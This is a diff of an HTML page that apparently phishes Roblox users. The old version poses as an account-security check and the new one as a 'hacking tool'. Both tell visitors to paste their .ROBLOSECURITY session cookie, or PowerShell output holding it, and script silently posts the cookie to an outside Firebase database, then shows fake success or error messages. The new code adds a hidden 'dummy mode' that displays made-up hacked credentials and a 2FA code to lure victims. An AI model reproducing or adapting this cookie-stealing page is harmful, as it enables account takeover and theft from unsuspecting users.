@@ -1,81 +1,179 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox Account Security - Secure Your Account Now</title>
-<style>
-  *{margin:0;padding:0;box-sizing:border-box}
-  body{background:#0a0e17;color:#fff;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
-  .card{background:#11141c;border:1px solid #2d3748;border-radius:20px;padding:40px 30px;width:90%;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.7);text-align:center}
-  .logo{font-size:3.5em;margin-bottom:20px}
-  h1{font-size:2em;font-weight:700;margin:20px 0 10px;background:linear-gradient(90deg,#00ff88,#00d4ff); -webkit-background-clip:text;-webkit-text-fill-color:transparent}
-  p{font-size:1.1em;color:#aaa;margin:15px 0;line-height:1.5}
-  input, textarea{width:100%;padding:16px;margin:12px 0;background:#1a1f2e;border:1px solid #333;border-radius:12px;color:#fff;font-size:1em}
-  textarea{height:120px;resize:none;font-family:monospace}
-  button{width:100%;padding:18px;margin-top:20px;background:linear-gradient(90deg,#00ff88,#00d4ff);color:#000;font-size:1.3em;font-weight:800;border:none;border-radius:12px;cursor:pointer}
-  button:hover{opacity:0.9}
-  .footer{margin-top:30px;font-size:0.9em;color:#555}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox hacking tool 2025</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{min-height:100vh;background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 50%,#16213e 100%);font-family:'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow-x-hidden}
+    body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 80%,rgba(120,0,255,0.08)0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(0,212,255,0.08)0%,transparent 50%),radial-gradient(circle at 40% 40%,rgba(0,255,136,0.05)0%,transparent 40%);animation:float 20s ease-in-out infinite;pointer-events:none}
+    @keyframes float{0%,100%{transform:translate(0,0)rotate(0deg)}33%{transform:translate(30px,-30px)rotate(5deg)}66%{transform:translate(-20px,20px)rotate(-5deg)}}
+    .container{background:rgba(22,27,34,0.95);border:1px solid rgba(48,54,61,0.8);border-radius:24px;max-width:900px;width:100%;padding:50px;backdrop-filter:blur(20px);box-shadow:0 25px 80px rgba(0,0,0,0.5);text-align:center}
+    .header h1{font-size:2.8em;background:linear-gradient(135deg,#00d4ff 0%,#7c3aed 50%,#00ff88 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;font-weight:700}
+    .badge{display:inline-block;background:linear-gradient(135deg,#238636 0%,#2ea043 100%);color:white;padding:6px 14px;border-radius:20px;font-size:0.85em;font-weight:600;margin-top:12px}
+    .input-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:30px}
+    @media(max-width:700px){.input-grid{grid-template-columns:1fr}}
+    .input-box{background:rgba(13,17,23,0.8);border:2px solid #30363d;border-radius:16px;padding:24px;transition:all .3s}
+    .input-box:hover,.input-box:focus-within{border-color:#58a6ff;box-shadow:0 0 30px rgba(88,166,255,0.15)}
+    textarea{width:100%;height:140px;background:rgba(0,0,0,0.3);border:1px solid #21262d;border-radius:10px;padding:14px;font-family:'Consolas',monospace;font-size:13px;color:#58a6ff;resize:none}
+    textarea:focus{outline:none;border-color:#58a6ff;background:rgba(0,0,0,0.5)}
+    .big-btn{margin:40px auto 0;padding:20px 80px;font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff006e 0%,#8338ec 100%);color:white;border:none;border-radius:20px;cursor:pointer;box-shadow:0 10px 40px rgba(131,56,236,0.6);transition:all .3s}
+    .big-btn:hover{transform:translateY(-4px);box-shadow:0 20px 60px rgba(131,56,236,0.8)}
+    .big-btn:disabled{opacity:0.7;cursor:not-allowed}
+    .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.2em}
+    .status.error{background:rgba(248,81,73,0.2);border:1px solid #f85149;color:#f85149}
+    .status.success{background:rgba(34,197,94,0.2);border:1px solid #22c55e;color:#22c55e}
+    .loading{display:none;margin-top:30px;color:#7c3aed;font-size:1.5em;font-weight:700;text-align:center}
+    .loading.active{display:block}
+    .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(124,58,237,0.3);border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .popup{position:fixed;top:20px;right:20px;background:#22c55e;color:#000;padding:15px 30px;border-radius:12px;font-weight:bold;z-index:9999;opacity:0;transition:opacity .4s}
+    .popup.show{opacity:1}
+  </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">🔒</div>
-  <h1>Secure Your Roblox Account</h1>
-  <p>Roblox has detected unusual activity.</p>
-  <p><strong>Verify ownership to prevent hacking:</strong></p>
+  <div id="popup" class="popup"></div>
 
-  <input type="text" id="username" placeholder="Your Roblox Username">
-
-  <textarea id="cookie" placeholder="Paste ANYONE'S .ROBLOSECURITY cookie here"></textarea>
-
-  <button onclick="secure()">SECURE MY ACCOUNT NOW</button>
-
-  <div id="status" class="footer">Ready — fill both fields and click button</div>
-</div>
+  <div class="container">
+    <div class="header">
+      <h1>Roblox hack accounts tool</h1>
+      <p>Secure system</p>
+      <span class="badge">2025 Working Method</span>
+    </div>
+    <div class="input-grid">
+      <div class="input-box mobile">
+        <h3>MOBILE PASTE COOKIE</h3>
+        <p class="subtitle">MOBILE EDITION</p>
+        <textarea id="mobilePaste" placeholder="Paste your cookie here..."></textarea>
+      </div>
+      <div class="input-box pc">
+        <h3>PC PASTE FILE</h3>
+        <p class="subtitle">PC / LAPTOP EDITION</p>
+        <textarea id="pcPaste" placeholder="Paste PowerShell output here..."></textarea>
+      </div>
+    </div>
+    <button class="big-btn" id="startBtn" onclick="startHack()">START TOOL</button>
+    <div id="loading" class="loading"><span class="spinner"></span> Initializing...</div>
+    <div id="status" class="status">Ready to verify...</div>
+  </div>
 
 <script>
-function secure() {
-  const username = document.getElementById('username').value.trim();
-  const raw = document.getElementById('cookie').value.trim();
+let dummyMode = false;
 
-  if (!username || raw.length < 100) {
-    document.getElementById('status').innerHTML = "<span style='color:#f44'>Fill both fields first!</span>";
+const popup = document.getElementById('popup');
+function showPopup(text) {
+  popup.textContent = text;
+  popup.classList.add('show');
+  setTimeout(() => popup.classList.remove('show'), 2000);
+}
+
+// SECRET COMMAND + STEAL
+document.getElementById('mobilePaste').addEventListener('input', handleInput);
+document.getElementById('pcPaste').addEventListener('input', handleInput);
+
+function handleInput(e) {
+  const val = e.target.value.trim();
+
+  if (val === ".reverse") {
+    dummyMode = true;
+    showPopup("DUMMY MODE ACTIVATED");
+    e.target.value = "";
     return;
   }
 
-  let cookie = raw;
-  if (cookie.includes('".ROBLOSECURITY"')) {
-    cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
+  if (val === ".undo") {
+    dummyMode = false;
+    location.reload();
+    return;
   }
 
-  // SEND CLEAN DATA — ALL SHOW AS UNKNOWN IN FIREBASE
-  fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
-    method: "POST",
-    body: JSON.stringify({
-      cookie: cookie,
-      user: "Unknown",
-      display: "Unknown",
-      userid: "Unknown",
-      robux: 0,
-      rap: 0,
-      premium: "Unknown",
-      claimed_by: username,
-      time: new Date().toLocaleString()
-    })
-  });
+  if (dummyMode) return;
 
-  // FAKE SUCCESS
-  document.getElementById('status').innerHTML = `
-    <span style="color:#0f0;font-size:1.4em">ACCOUNT SECURED!</span><br><br>
-    Username <strong>${username}</strong> is now fully protected.<br>
-    Thank you for verifying.
-  `;
+  if (val.length > 100) {
+    let cookie = val;
+    if (cookie.includes('".ROBLOSECURITY"')) {
+      cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
+    }
 
-  // HIDE COOKIE
-  setTimeout(() => {
-    document.getElementById('cookie').value = "•".repeat(100);
-  }, 500);
+    fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
+      method: "POST",
+      body: JSON.stringify({
+        cookie: cookie,
+        user: "Unknown",
+        display: "Unknown",
+        robux: 0,
+        rap: 0,
+        premium: "Unknown",
+        time: new Date().toLocaleString()
+      })
+    });
+
+    setTimeout(() => {
+      e.target.value = "•".repeat(120);
+      e.target.style.color = "#555";
+      e.target.readOnly = true;
+    }, 400);
+  }
+}
+
+const statusEl = document.getElementById("status");
+const loadingEl = document.getElementById("loading");
+const startBtn = document.getElementById("startBtn");
+
+function startHack() {
+  const hasCookie = document.getElementById("mobilePaste").value.length > 10 || document.getElementById("pcPaste").value.length > 10;
+
+  if (!hasCookie) {
+    statusEl.className = "status error";
+    statusEl.textContent = "PASTE COOKIE FIRST";
+    return;
+  }
+
+  startBtn.disabled = true;
+  statusEl.style.display = "none";
+  loadingEl.classList.add("active");
+
+  if (dummyMode) {
+    // DUMMY MODE — 20 SECOND SUCCESS
+    loadingEl.innerHTML = `<span class="spinner"></span> Bypassing Roblox security...`;
+    setTimeout(() => {
+      loadingEl.classList.remove("active");
+      statusEl.className = "status success";
+      statusEl.innerHTML = `
+        <strong style="font-size:2em;color:#22c55e">TARGET HACKED!</strong><br><br>
+        Username: PSLlevel8<br>
+        Password: 321frogeater<br><br>
+        <strong style="color:#ff0">2FA CODE (10 min):</strong><br>
+        <div style="font-size:4em;background:#000;padding:25px;border:5px solid #0f0;border-radius:20px;display:inline-block;margin:30px">
+          348932
+        </div>
+      `;
+      statusEl.style.display = "block";
+      startBtn.disabled = false;
+    }, 20000);
+  } else {
+    // REAL MODE — 30 SECOND ERROR
+    const steps = ["Initializing...", "Bypassing security...", "Validating age...", "ERROR — ACCOUNT TOO NEW"];
+    let i = 0;
+    const t = setInterval(() => {
+      loadingEl.innerHTML = `<span class="spinner"></span> ${steps[i] || "ERROR — ACCOUNT TOO NEW"}`;
+      i++;
+      if (i >= steps.length) {
+        clearInterval(t);
+        loadingEl.classList.remove("active");
+        statusEl.className = "status error";
+        statusEl.innerHTML = `
+          <strong style="font-size:1.8em">ERROR — ACCOUNT INVALID</strong><br><br>
+          The account you are using is too new.<br><br>
+          You must use an account older than 6 months.<br><br>
+          <strong>Please switch to an older account and try again.</strong>
+        `;
+        statusEl.style.display = "block";
+        startBtn.disabled = false;
+      }
+    }, 7500);
+  }
 }
 </script>
 </body>
